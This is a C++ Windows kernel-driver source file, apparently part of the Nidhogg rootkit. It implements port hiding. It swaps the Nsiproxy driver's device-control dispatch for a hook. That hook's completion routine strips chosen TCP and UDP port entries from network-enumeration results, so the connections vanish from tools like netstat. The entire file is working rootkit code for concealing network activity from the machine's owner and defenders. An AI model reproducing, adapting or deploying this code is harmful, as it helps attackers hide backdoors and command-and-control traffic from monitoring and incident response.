#include "pch.h"
#include "NetworkUtils.hpp"

//
// Constructor
//
NetworkUtils::NetworkUtils() {
    this->CallbackActivated = false;
    OriginalNsiDispatchAddress = nullptr;
    this->HiddenPortsList.LastIndex = 0;
    this->HiddenPortsList.PortsCount = 0;
    memset(&this->HiddenPortsList.Ports, 0, MAX_PORTS * sizeof(HiddenPort));
    this->HiddenPortsList.Lock.Init();
}

//
// Destructor
//
NetworkUtils::~NetworkUtils() {
    if (this->CallbackActivated) {
        this->CallbackActivated = false;
        UninstallNsiHook();
        this->OriginalNsiDispatchAddress = nullptr;
    }
    ClearHiddenPortsList();
}

//
// InstallNsiHook: Hooks the NSI dispatch function
//
NTSTATUS NetworkUtils::InstallNsiHook() {
    UNICODE_STRING driverName;
    PDRIVER_OBJECT driverObject = nullptr;
    NTSTATUS status = STATUS_SUCCESS;

    RtlInitUnicodeString(&driverName, L"\\Driver\\Nsiproxy");
    status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, nullptr, 0, *IoDriverObjectType, KernelMode, nullptr, (PVOID*)&driverObject);
    if (!NT_SUCCESS(status))
        return status;

    this->OriginalNsiDispatchAddress = (PVOID)InterlockedExchange64(
        (LONG64*)&driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
        (LONG64)HookedNsiDispatch);
    this->CallbackActivated = true;

    ObDereferenceObject(driverObject);
    return status;
}

//
// UninstallNsiHook: Restores the original NSI dispatch function
//
NTSTATUS NetworkUtils::UninstallNsiHook() {
    UNICODE_STRING driverName;
    PDRIVER_OBJECT driverObject = nullptr;
    NTSTATUS status = STATUS_SUCCESS;

    RtlInitUnicodeString(&driverName, L"\\Driver\\Nsiproxy");
    status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, nullptr, 0, *IoDriverObjectType, KernelMode, nullptr, (PVOID*)&driverObject);
    if (!NT_SUCCESS(status))
        return status;

    InterlockedExchange64(
        (LONG64*)&driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
        (LONG64)this->OriginalNsiDispatchAddress);
    this->OriginalNsiDispatchAddress = nullptr;
    this->CallbackActivated = false;

    ObDereferenceObject(driverObject);
    return status;
}

//
// RemoveEntry: Helper to remove an entry at index 'index' by shifting subsequent entries.
// This function also shifts the parallel status and process entries, if available.
// It then decrements nsiParameter->Count.
//
void RemoveEntry(
    PVOID Entries,
    PNSI_PARAM nsiParameter,
    PNSI_STATUS_ENTRY statusEntries,
    PNSI_PROCESS_ENTRY processEntries,
    SIZE_T index)
{
    PUCHAR pEntries = reinterpret_cast<PUCHAR>(Entries);

    if (index + 1 >= nsiParameter->Count) {
        // If this is the last element, clear it.
        RtlZeroMemory(pEntries + index * nsiParameter->EntrySize, nsiParameter->EntrySize);
        if (statusEntries) {
            RtlZeroMemory(&statusEntries[index], sizeof(NSI_STATUS_ENTRY));
        }
        if (processEntries) {
            RtlZeroMemory(&processEntries[index], nsiParameter->ProcessEntrySize);
        }
    }
    else {
        // Otherwise, shift the subsequent entries left.
        SIZE_T bytesToMove = (nsiParameter->Count - (index + 1)) * nsiParameter->EntrySize;
        RtlMoveMemory(
            pEntries + index * nsiParameter->EntrySize,
            pEntries + (index + 1) * nsiParameter->EntrySize,
            bytesToMove);

        if (statusEntries) {
            SIZE_T bytesToMoveStatus = (nsiParameter->Count - (index + 1)) * sizeof(NSI_STATUS_ENTRY);
            RtlMoveMemory(
                &statusEntries[index],
                &statusEntries[index + 1],
                bytesToMoveStatus);
        }
        if (processEntries) {
            SIZE_T bytesToMoveProcess = (nsiParameter->Count - (index + 1)) * nsiParameter->ProcessEntrySize;
            RtlMoveMemory(
                &processEntries[index],
                &processEntries[index + 1],
                bytesToMoveProcess);
        }
    }

    nsiParameter->Count--;
}

//
// NsiIrpComplete: Called upon IRP completion for the hooked NSI dispatch.
// It filters out entries matching hidden ports.
//
NTSTATUS NsiIrpComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
    HookedCompletionRoutine* pContext = (HookedCompletionRoutine*)Context;

    if (NT_SUCCESS(Irp->IoStatus.Status)) {
        do {
            PNSI_PARAM nsiParameter = (PNSI_PARAM)Irp->UserBuffer;

            // Validate pointer (handle both usermode and kernelmode pointers)
            if (VALID_USERMODE_MEMORY((ULONGLONG)nsiParameter)) {
                if (!NT_SUCCESS(ProbeAddress(nsiParameter, sizeof(PNSI_PARAM), sizeof(PNSI_PARAM), STATUS_UNSUCCESSFUL)))
                    break;
            }
            else if (!VALID_KERNELMODE_MEMORY((ULONGLONG)nsiParameter) || !nsiParameter)
                break;

            if (nsiParameter->Entries && nsiParameter->EntrySize > 0) {
                // Process TCP entries
                if (nsiParameter->Type == COMUNICATION_TYPE::TCP) {
                    PNSI_TABLE_TCP_ENTRY tcpEntries = (PNSI_TABLE_TCP_ENTRY)nsiParameter->Entries;
                    PNSI_STATUS_ENTRY statusEntries = (PNSI_STATUS_ENTRY)nsiParameter->StatusEntries;
                    PNSI_PROCESS_ENTRY processEntries = (PNSI_PROCESS_ENTRY)nsiParameter->ProcessEntries;

                    // Loop through TCP entries and remove those that match hidden ports.
                    for (SIZE_T i = 0; i < nsiParameter->Count; /* increment only if not removed */) {
                        bool removed = false;
                        __try {
                            HiddenPort hiddenPort{};
                            // Check local port first.
                            hiddenPort.Port = htohs(tcpEntries[i].Local.Port);
                            hiddenPort.Type = PortType::TCP;
                            hiddenPort.Remote = false;
                            if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
                                RemoveEntry(tcpEntries, nsiParameter, statusEntries, processEntries, i);
                                removed = true;
                            }
                            else {
                                // Check remote port if local port did not match.
                                hiddenPort.Port = htohs(tcpEntries[i].Remote.Port);
                                hiddenPort.Type = PortType::TCP;
                                hiddenPort.Remote = true;
                                if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
                                    RemoveEntry(tcpEntries, nsiParameter, statusEntries, processEntries, i);
                                    removed = true;
                                }
                            }
                        }
                        __except (EXCEPTION_EXECUTE_HANDLER) {
                            // In case of exception, skip to the next entry.
                        }

                        if (!removed)
                            i++;  // Only advance if no removal occurred.
                    }
                }
                // Process UDP entries
                else if (nsiParameter->Type == COMUNICATION_TYPE::UDP) {
                    PNSI_UDP_ENTRY udpEntries = (PNSI_UDP_ENTRY)nsiParameter->Entries;
                    PNSI_STATUS_ENTRY statusEntries = (PNSI_STATUS_ENTRY)nsiParameter->StatusEntries;
                    PNSI_PROCESS_ENTRY processEntries = (PNSI_PROCESS_ENTRY)nsiParameter->ProcessEntries;

                    for (SIZE_T i = 0; i < nsiParameter->Count; /* increment only if not removed */) {
                        bool removed = false;
                        __try {
                            HiddenPort hiddenPort{};
                            hiddenPort.Port = htohs(udpEntries[i].Port);
                            hiddenPort.Type = PortType::UDP;
                            if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
                                RemoveEntry(udpEntries, nsiParameter, statusEntries, processEntries, i);
                                removed = true;
                            }
                        }
                        __except (EXCEPTION_EXECUTE_HANDLER) {
                            // On exception, simply continue.
                        }

                        if (!removed)
                            i++;
                    }
                }
            }
        } while (false);
    }

    if (pContext->OriginalCompletionRoutine) {
        PIO_COMPLETION_ROUTINE originalRoutine = pContext->OriginalCompletionRoutine;
        PVOID originalContext = pContext->OriginalContext;
        ExFreePoolWithTag(Context, DRIVER_TAG);
        return originalRoutine(DeviceObject, Irp, originalContext);
    }

    ExFreePoolWithTag(Context, DRIVER_TAG);
    return STATUS_SUCCESS;
}

//
// HookedNsiDispatch: Intercepts IOCTLs and installs our custom completion routine
//
NTSTATUS HookedNsiDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    auto stack = IoGetCurrentIrpStackLocation(Irp);

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS) {
		HookedCompletionRoutine* context = AllocateMemory<HookedCompletionRoutine*>(sizeof(HookedCompletionRoutine), false);

        if (context) {
            context->OriginalCompletionRoutine = stack->CompletionRoutine;
            context->OriginalContext = stack->Context;
            stack->Context = context;
            stack->CompletionRoutine = NsiIrpComplete;
            stack->Control |= SL_INVOKE_ON_SUCCESS;
        }
    }

    return ((PDRIVER_DISPATCH)NidhoggNetworkUtils->GetOriginalCallback())(DeviceObject, Irp);
}

//
// FindHiddenPort: Searches the hidden ports list for a match.
//
bool NetworkUtils::FindHiddenPort(HiddenPort port) {
    AutoLock locker(this->HiddenPortsList.Lock);
    for (USHORT i = 0; i <= this->HiddenPortsList.LastIndex; i++) {
        if (this->HiddenPortsList.Ports[i].Port == port.Port &&
            this->HiddenPortsList.Ports[i].Type == port.Type) {
            if (port.Type == PortType::TCP && this->HiddenPortsList.Ports[i].Type == PortType::TCP) {
                if (this->HiddenPortsList.Ports[i].Remote != port.Remote)
                    continue;
            }
            return true;
        }
    }
    return false;
}

//
// AddHiddenPort: Adds a port to the hidden ports list and installs the hook if needed.
//
bool NetworkUtils::AddHiddenPort(HiddenPort port) {
    AutoLock locker(this->HiddenPortsList.Lock);
    for (USHORT i = 0; i < MAX_PORTS; i++) {
        if (this->HiddenPortsList.Ports[i].Port == 0) {
            this->HiddenPortsList.Ports[i].Port = port.Port;
            this->HiddenPortsList.Ports[i].Type = port.Type;
            this->HiddenPortsList.Ports[i].Remote = port.Remote;
            if (i > this->HiddenPortsList.LastIndex)
                this->HiddenPortsList.LastIndex = i;
            this->HiddenPortsList.PortsCount++;
            if (!this->CallbackActivated) {
                NTSTATUS status = this->InstallNsiHook();
                if (!NT_SUCCESS(status)) {
                    this->RemoveHiddenPort(port);
                    break;
                }
            }
            return true;
        }
    }
    return false;
}

//
// RemoveHiddenPort: Removes a port from the hidden ports list.
//
bool NetworkUtils::RemoveHiddenPort(HiddenPort port) {
    USHORT newLastIndex = 0;
    AutoLock locker(this->HiddenPortsList.Lock);
    for (USHORT i = 0; i <= this->HiddenPortsList.LastIndex; i++) {
        if (this->HiddenPortsList.Ports[i].Port != 0) {
            if (this->HiddenPortsList.Ports[i].Port == port.Port &&
                this->HiddenPortsList.Ports[i].Type == port.Type) {
                if (this->HiddenPortsList.Ports[i].Type == PortType::TCP) {
                    if (this->HiddenPortsList.Ports[i].Remote != port.Remote) {
                        newLastIndex = i;
                        continue;
                    }
                }
                if (i == this->HiddenPortsList.LastIndex)
                    this->HiddenPortsList.LastIndex = newLastIndex;
                this->HiddenPortsList.Ports[i].Port = 0;
                this->HiddenPortsList.PortsCount--;
                if (this->GetPortsCount() == 0 && this->CallbackActivated) {
                    this->UninstallNsiHook();
                }
                return true;
            }
            else
                newLastIndex = i;
        }
    }
    return false;
}

//
// ClearHiddenPortsList: Clears the entire hidden ports list.
//
void NetworkUtils::ClearHiddenPortsList() {
    AutoLock locker(this->HiddenPortsList.Lock);
    memset(&this->HiddenPortsList.Ports, 0, MAX_PORTS * sizeof(HiddenPort));
    this->HiddenPortsList.LastIndex = 0;
    this->HiddenPortsList.PortsCount = 0;
}

//
// QueryHiddenPorts: Fills the provided structure with the hidden ports.
//
void NetworkUtils::QueryHiddenPorts(OutputHiddenPorts* outputHiddenPorts) {
    USHORT outputIndex = 0;
    AutoLock locker(this->HiddenPortsList.Lock);
    outputHiddenPorts->PortsCount = this->HiddenPortsList.PortsCount;
    for (USHORT i = 0; i <= this->HiddenPortsList.LastIndex; i++) {
        if (this->HiddenPortsList.Ports[i].Port != 0) {
            outputHiddenPorts->Ports[outputIndex].Port = this->HiddenPortsList.Ports[i].Port;
            outputHiddenPorts->Ports[outputIndex].Type = this->HiddenPortsList.Ports[i].Type;
            outputIndex++;
        }
    }
}
